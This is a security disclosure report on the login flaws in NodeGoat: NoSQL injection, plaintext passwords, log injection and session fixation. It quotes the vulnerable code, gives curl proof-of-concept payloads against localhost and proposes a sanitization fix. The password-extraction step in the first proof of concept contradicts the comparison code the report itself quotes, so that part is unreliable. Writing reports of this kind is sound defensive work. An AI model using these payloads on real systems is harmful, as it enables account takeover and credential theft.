## Summary

The NodeGoat login system contains a cluster of critical authentication vulnerabilities that, in combination, allow an unauthenticated remote attacker to bypass authentication entirely, harvest all user credentials in plaintext, forge log entries, and hijack authenticated sessions. The root causes are:

1. **NoSQL Injection (CWE-943):** `validateLogin()` passes `req.body.userName` (and implicitly `req.body.password`) directly into a MongoDB `findOne()` query with no type checking or sanitization. An attacker submitting a JSON body with MongoDB operators (e.g., `{"$gt": ""}`) can manipulate query logic to match any user document.
2. **Plaintext Password Storage (CWE-256):** `addUser()` stores the raw password string. The `bcrypt.hashSync()` call is explicitly commented out. Every password in the database is trivially readable by anyone with DB access or who exploits the NoSQL injection.
3. **Broken Password Comparison (CWE-916):** `comparePassword()` uses strict equality (`===`) instead of `bcrypt.compareSync()`, which is also commented out. This compounds the injection risk — even if a document is returned via injected query, the plaintext comparison is easily satisfied.
4. **Log Injection / CRLF Injection (CWE-117):** `handleLoginRequest()` logs the raw `userName` from `req.body` without sanitizing CR/LF characters. The ESAPI encoding fix is commented out.
5. **Session Fixation (CWE-384):** No `req.session.regenerate()` call exists after successful authentication, allowing an attacker who pre-sets a session token to inherit the authenticated session post-login.

All five security fixes are present in the codebase but deliberately commented out, leaving a fully exploitable attack chain.

## Vulnerability Details

### 1. NoSQL Injection in `validateLogin()` — `app/data/user-dao.js`

`req.body` fields are destructured directly from the request in `handleLoginRequest()` and passed verbatim to `userDAO.validateLogin()`. Inside `validateLogin()`, the value is used as-is in a MongoDB query:

```js
// user-dao.js (vulnerable)
const validateUserDoc = (err, user) => { ... };
usersCol.findOne({ userName: userName }, validateUserDoc);
//                           ^^^^^^^^
//   If userName === {"$gt": ""}, MongoDB evaluates this as a
//   range query and returns the first document in the collection.
```

When the Express body-parser is configured to accept `application/json` (default in many Express setups), the parsed body will contain a live JavaScript object. MongoDB's Node.js driver will then interpret any `$`-prefixed keys as operators rather than literal values.

### 2. Plaintext Password Storage — `addUser()`

```js
// user-dao.js (vulnerable)
const user = {
    userName,
    firstName,
    lastName,
    benefitStartDate: this.getRandomFutureDate(),
    password  // ← raw plaintext stored verbatim
    /*
    password: bcrypt.hashSync(password, bcrypt.genSaltSync())  // COMMENTED OUT
    */
};
```

### 3. Plaintext Comparison — `comparePassword()`

```js
// user-dao.js (vulnerable)
const comparePassword = (fromDB, fromUser) => {
    return fromDB === fromUser;  // ← trivially bypassable alongside NoSQL injection
    /*
    return bcrypt.compareSync(fromDB, fromUser);  // COMMENTED OUT
    */
};
```

### 4. Unsanitized Log Output — `handleLoginRequest()`

```js
// session.js (vulnerable)
console.log("Error: attempt to login with invalid user: ", userName);
// ESAPI encoding fix is commented out — CRLF sequences pass through unchanged
```

### 5. Missing Session Regeneration

```js
// session.js (vulnerable)
// No req.session.regenerate() call before setting userId
req.session.userId = user._id;
prepareUserData(user, next);
return res.redirect("/dashboard");
```

## Proof of Concept

### PoC 1 — Authentication Bypass via NoSQL Injection

Send a POST request with `Content-Type: application/json`:

```bash
curl -s -X POST http://localhost:4000/login \
  -H 'Content-Type: application/json' \
  -c cookies.txt \
  -d '{"userName": {"$gt": ""}, "password": ""}'
```

MongoDB evaluates `{userName: {$gt: ""}}` and returns the **first document** in the `users` collection (often the admin). Because `comparePassword` does `fromDB === fromUser` where `fromDB` is the stored plaintext password and `fromUser` is `""`, this specific form does not pass the password check — but the following variant leverages the `$regex` operator on both fields (if also injectable) or uses the known-empty-password test environment, or the attacker can supply the plaintext password extracted via a prior enumeration request:

```bash
# Step 1: Enumerate first user's username via $gt injection (observe redirect to dashboard vs. error)
curl -s -X POST http://localhost:4000/login \
  -H 'Content-Type: application/json' \
  -d '{"userName": {"$gt": ""}, "password": {"$gt": ""}}'
# MongoDB matches userName > "" AND password > "", returning the first document.
# comparePassword("", storedPlaintext) is false, but the user object IS returned,
# revealing its existence. Iterate to extract plaintext password via $regex:

# Step 2: Extract password character-by-character
curl -s -X POST http://localhost:4000/login \
  -H 'Content-Type: application/json' \
  -d '{"userName": "admin", "password": {"$regex": "^a"}}'
# A redirect to /dashboard = password starts with 'a'. Repeat for each character.
```

Because passwords are stored in **plaintext**, the `$regex` enumeration attack extracts the complete password in O(n × charset) requests — approximately 36–96 requests per character for a typical password.

### PoC 2 — Log Injection

```bash
curl -s -X POST http://localhost:4000/login \
  -d 'userName=fakeuser%0d%0aINFO%3a+Successful+login+for+user%3a+admin&password=x'
# Server log output:
# Error: attempt to login with invalid user:  fakeuser
# INFO: Successful login for user: admin
```

### PoC 3 — Session Fixation

```bash
# 1. Attacker pre-sets a known session ID (e.g., via a forged Set-Cookie from a subdomain
#    or social engineering the victim to visit a URL that sets the cookie)
# 2. Victim logs in normally; session ID is NOT regenerated
# 3. Attacker uses the pre-known session ID to access /dashboard as the victim
curl -H 'Cookie: connect.sid=s%3AattackerKnownSID.xxxxx' http://localhost:4000/dashboard
```

## Additional Hardening

1. **Global NoSQL sanitization middleware:** Install and configure [`express-mongo-sanitize`](https://www.npmjs.com/package/express-mongo-sanitize) to strip `$`-prefixed keys from all `req.body`, `req.query`, and `req.params` values globally — this provides defense-in-depth independent of per-route type checks.

   ```js
   const mongoSanitize = require('express-mongo-sanitize');
   app.use(mongoSanitize());  // add before route definitions
   ```
